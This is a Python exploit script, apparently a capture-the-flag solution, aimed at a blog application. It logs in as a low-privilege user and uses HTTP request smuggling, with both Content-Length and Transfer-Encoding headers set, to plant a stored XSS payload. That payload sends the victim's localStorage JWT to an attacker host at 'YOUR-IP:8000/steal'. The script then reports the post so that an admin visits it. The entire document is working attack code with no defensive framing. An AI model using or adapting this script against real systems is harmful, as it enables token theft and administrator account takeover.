import requests
import time

SERVER_URL = "http://54.198.62.41/"  # Change this to your target IP

def login_user():
    """Login and get JWT token"""
    login_data = {
        "username": "user",
        "password": "user123"
    }
    r = requests.post(f"{SERVER_URL}/api/auth/login", json=login_data)
    return r.json()['token']

def exploit():
    # Step 1: Login as normal user
    user_token = login_user()
    print(f"[+] Got user token: {user_token[:20]}...")

    # Step 2: Create smuggled request with XSS payload
    xss_payload = '<script>fetch("http://YOUR-IP:8000/steal?" + localStorage.getItem("token"))</script>'
    
    # Craft headers for smuggling
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '4',
        'Transfer-Encoding': 'chunked',
        'Connection': 'keep-alive',
        'X-Special-Key': 'secret_cache_key',
        'Authorization': f'Bearer {user_token}'
    }

    # Create body with smuggled content
    body = (
        "XXXX"  # Matches Content-Length: 4
        "\r\n0\r\n\r\n"  # End chunked request
        "GET /api/blog/post/1 HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "X-Special-Key: secret_cache_key\r\n"
        "Content-Type: application/json\r\n"
        "\r\n"
        f'{{"content": "{xss_payload}"}}'
    )

    # Send smuggled request
    print("[+] Sending smuggled request...")
    r = requests.post(
        f"{SERVER_URL}/api/blog/post/1",
        headers=headers,
        data=body
    )
    print(f"[+] Smuggle response: {r.status_code}")

    # Step 3: Report post to trigger admin visit
    print("[+] Reporting post...")
    headers = {
        'Authorization': f'Bearer {user_token}',
        'Content-Type': 'application/json'
    }
    report_data = {"postId": 1}
    r = requests.post(
        f"{SERVER_URL}/api/blog/report",
        headers=headers,
        json=report_data
    )
    print(f"[+] Report sent: {r.status_code}")

if __name__ == "__main__":
    exploit()